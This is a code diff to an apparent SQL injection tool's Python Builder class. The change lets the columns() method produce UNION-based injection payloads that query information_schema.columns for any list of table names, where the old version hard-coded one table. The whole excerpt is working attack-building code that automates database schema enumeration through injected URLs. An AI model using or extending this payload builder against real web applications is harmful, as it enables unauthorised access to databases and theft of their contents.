@@ -61,19 +61,25 @@ class Builder:
         return injections 
 
     
-    def columns(self, num_cols, magic_col):
+    def columns(self, num_cols, magic_col, tables):
         """ Build SQLI to get columns of a specified table.
             :num_cols:  Number of columns for UNION statement.
             :magic_col: Column number that is most visible, and therefore used for injection parameter.
+            :tables: List of tables to get columns for.
             :returns:   Dict of strings->strings with queries regarding table's columns
         """
 
+        injections = {}
         union_urls = self.union_nums(num_cols) 
         union_urls[magic_col - 1] = self.delimiter + 'column_name' 
         a = self.null_url + self.delimiter + self.union_string + ','.join(union_urls)
         a += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'
-        a += self.delimiter + 'where' + self.delimiter + 'table_name=\'user\''
-        return {'users' : a}
+        a += self.delimiter + 'where' + self.delimiter + 'table_name='
+        
+        for table in tables:
+            injections[table] = a + "'" + table + "'"
+
+        return injections
 
     def rows(self, num_cols, magic_col, table_name, col_names):
         """ Build SQLI to get values of each column in a specified table.
